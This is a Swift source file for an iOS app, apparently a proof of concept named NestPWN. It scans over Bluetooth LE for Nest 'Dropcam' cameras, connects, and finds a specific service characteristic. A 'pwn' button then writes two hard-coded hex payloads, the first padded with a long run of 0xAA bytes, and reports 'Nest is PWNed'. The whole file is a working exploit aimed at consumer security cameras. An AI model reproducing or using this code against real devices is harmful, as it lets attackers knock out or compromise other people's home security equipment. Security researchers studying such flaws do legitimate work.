//
//  ViewController.swift
//  Beacon
//
//  Created by Troy Stribling on 4/13/15.
//  Copyright (c) 2017 Troy Stribling. The MIT License (MIT).
//

import UIKit
import CoreBluetooth
import BlueCapKit

public enum AppError : Error {
    case charactertisticNotFound
    case notANestCamera
    case serviceNotFound
    case invalidState
    case resetting
    case poweredOff
    case unknown
    case unlikley
}

class ViewController: UITableViewController {
    
    struct MainStoryboard {
        static let updatePeriodValueSegue = "UpdatePeriodValue"
        static let updatePeriodRawValueSegue = "UpdatePeriodRawValue"
    }

    @IBOutlet var activateSwitch: UISwitch!
    @IBOutlet var statusLabel: UILabel!
    @IBOutlet var pwnButton: UIButton!
    
    var peripheral: Peripheral?
    var pwnCharacteristic: Characteristic?

    let pwnServiceUUID = CBUUID(string: "D2D3F8EF-9C99-4D9C-A2B3-91C85D44326C")
    let pwnCharacteristicUUID = CBUUID(string: "7606123e-4282-4ed4-aca1-2374de7fdb61")
    let nestCameraName = "Dropcam"
    let pwnPayload1 = "3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    let pwnPayload2 = "3b"
    
    let manager = CentralManager(options: [CBCentralManagerOptionRestoreIdentifierKey : "us.gnos.BlueCap.NestPWN" as NSString])
    
    required init?(coder aDecoder: NSCoder) {
        super.init(coder: aDecoder)
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        updateUIStatus()
    }
    
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
    }
    
    @IBAction func toggleActivate(_ sender: AnyObject) {
        if activateSwitch.isOn  {
            activate()
        } else {
            deactivate()
        }
    }
    
    
    @IBAction func pwn(_ sender: AnyObject) {
        
        guard let peripheral = self.peripheral, peripheral.state != .disconnected, let pwnCharacteristic = pwnCharacteristic else {
            self.present(UIAlertController.alertWithMessage("This should not happen"), animated:true, completion:nil)
            return
        }
        
        let writeFuture = pwnCharacteristic.write(data: pwnPayload1.dataFromHexString() , timeout: 10.0).flatMap { [unowned self] in
            pwnCharacteristic.write(data: self.pwnPayload2.dataFromHexString())
        }
        
        writeFuture.onSuccess { [unowned self] _ in
            self.present(UIAlertController.alertWithMessage("Nest is PWNed"), animated:true, completion:nil)
        }
        
        writeFuture.onFailure { [unowned self] error in
            self.present(UIAlertController.alertOnError(error), animated:true, completion:nil)
        }
    }
    
    func activate() {
        
        let discoverCharacteristicFuture = manager.whenStateChanges().flatMap { [unowned self] state -> FutureStream<Peripheral> in
                switch state {
                case .poweredOn:
                    return self.manager.startScanning(capacity:10, options: [CBCentralManagerScanOptionAllowDuplicatesKey : true])
                case .poweredOff:
                    throw AppError.poweredOff
                case .unauthorized, .unsupported:
                    throw AppError.invalidState
                case .resetting:
                    throw AppError.resetting
                case .unknown:
                    throw AppError.unknown
                }
        }.flatMap { [unowned self] peripheral -> FutureStream<Void> in
            Logger.debug("discovered name: \(peripheral.name)")
            guard peripheral.name == self.nestCameraName else {
                throw AppError.notANestCamera
            }
            Logger.debug("Found a nest cam")
            self.manager.stopScanning()
            self.peripheral = peripheral
            return peripheral.connect(connectionTimeout: 10.0)
        }.flatMap { [unowned self] () -> Future<Void> in
            guard let peripheral = self.peripheral else {
                throw AppError.unlikley
            }
            self.updateUIStatus()
            return peripheral.discoverServices([self.pwnServiceUUID])
        }.flatMap { [unowned self] () -> Future<Void> in
            guard let peripheral = self.peripheral else {
                throw AppError.unlikley
            }
            guard let service = peripheral.services(withUUID: self.pwnServiceUUID)?.first else {
                throw AppError.serviceNotFound
            }
            return service.discoverCharacteristics([self.pwnCharacteristicUUID])
        }

        discoverCharacteristicFuture.onFailure { [unowned self] error in
            switch error {
            case AppError.charactertisticNotFound:
                fallthrough
            case AppError.serviceNotFound:
                self.peripheral?.disconnect()
                self.present(UIAlertController.alertOnError(error), animated:true, completion:nil)
            case AppError.invalidState:
                self.present(UIAlertController.alertWithMessage("Invalid state"), animated: true, completion: nil)
            case AppError.resetting:
                self.manager.reset()
                self.present(UIAlertController.alertWithMessage("Bluetooth service resetting"), animated: true, completion: nil)
            case AppError.poweredOff:
                self.present(UIAlertController.alertWithMessage("Bluetooth powered off"), animated: true, completion: nil)
            case AppError.unknown:
                break
            case AppError.notANestCamera:
                break
            case PeripheralError.disconnected:
                self.peripheral?.reconnect()
            case PeripheralError.forcedDisconnect:
                break
            default:
                self.present(UIAlertController.alertOnError(error), animated:true, completion:nil)
            }
            self.pwnButton.setTitleColor(UIColor.lightGray, for: .normal)
            self.pwnButton.isEnabled = false
        }

        discoverCharacteristicFuture.onSuccess { [unowned self] in
            guard let peripheral = self.peripheral, let service = peripheral.services(withUUID: self.pwnServiceUUID)?.first else {
                return
            }
            guard let characteristic = service.characteristics(withUUID: self.pwnCharacteristicUUID)?.first else {
                return
            }
            self.pwnCharacteristic = characteristic
            self.pwnButton.setTitleColor(UIColor.black, for: .normal)
            self.pwnButton.isEnabled = true
        }
    }
    
    func updateUIStatus() {
        if let peripheral = peripheral {
            switch peripheral.state {
            case .connected:
                statusLabel.text = "Connected"
                statusLabel.textColor = UIColor(red:0.2, green:0.7, blue:0.2, alpha:1.0)
            case .connecting:
                statusLabel.text = "Connecting"
                statusLabel.textColor = UIColor(red:0.9, green:0.7, blue:0.0, alpha:1.0)
            case .disconnected:
                statusLabel.text = "Disconnected"
                statusLabel.textColor = UIColor.lightGray
            case .disconnecting:
                statusLabel.text = "Disconnecting"
                statusLabel.textColor = UIColor.lightGray
            }
        } else {
            statusLabel.text = "Disconnected"
            statusLabel.textColor = UIColor.lightGray
            activateSwitch.isOn = false
        }
    }
    
    func deactivate() {
        guard let peripheral = self.peripheral else {
            return
        }
        peripheral.terminate()
        self.peripheral = nil
        updateUIStatus()
    }
}
